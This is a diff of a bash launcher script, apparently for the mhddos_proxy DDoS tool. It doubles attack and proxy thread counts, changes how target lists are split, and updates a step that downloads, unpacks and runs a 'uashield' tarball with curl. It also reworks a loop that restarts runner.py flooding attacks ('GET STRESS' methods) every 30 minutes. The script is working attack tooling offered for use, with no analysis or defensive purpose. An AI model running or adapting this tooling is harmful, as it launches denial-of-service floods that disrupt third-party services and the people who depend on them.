@@ -35,11 +35,11 @@ if [[ $docker_mode != "true" ]]; then
 fi
 
 if [[ $t_set_manual != "on" ]]; then
-    export threads="-t 2500"
+    export threads="-t 5000"
 fi
 
 if [[ $t_proxy_manual != "on" ]]; then
-    export proxy_threads="1000"
+    export proxy_threads="2000"
 fi
 
 export methods="--http-methods GET STRESS"
@@ -74,7 +74,7 @@ cat $targets_line_by_line | sort | uniq | sort -R > $targets_uniq
 
 #split targets by line in N files
 cd /var/tmp/
-split -n l/2 --additional-suffix=.uaripper $targets_uniq
+split -n l/1 --additional-suffix=.uaripper $targets_uniq
 cd -
 
 # Print greetings and number of targets (secondary, main, total)
@@ -134,7 +134,7 @@ fi
 
 if [[ $uashield == "on" ]]; then
 sleep 0.2
-tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
+tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.6/shield-1.0.6.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
 fi
 
 if [[ $proxy_finder == "on" ]]; then
@@ -213,11 +213,10 @@ fi
 
 # Restart attacks and update targets every 30 minutes
 while true; do
-echo "threads: "$threads; echo "methods: "$methods
         pkill -f start.py; pkill -f runner.py 
         python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
-        sleep 10 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
+        # sleep 10 # to decrease load on cpu during simultaneous start
+        # python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
         # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
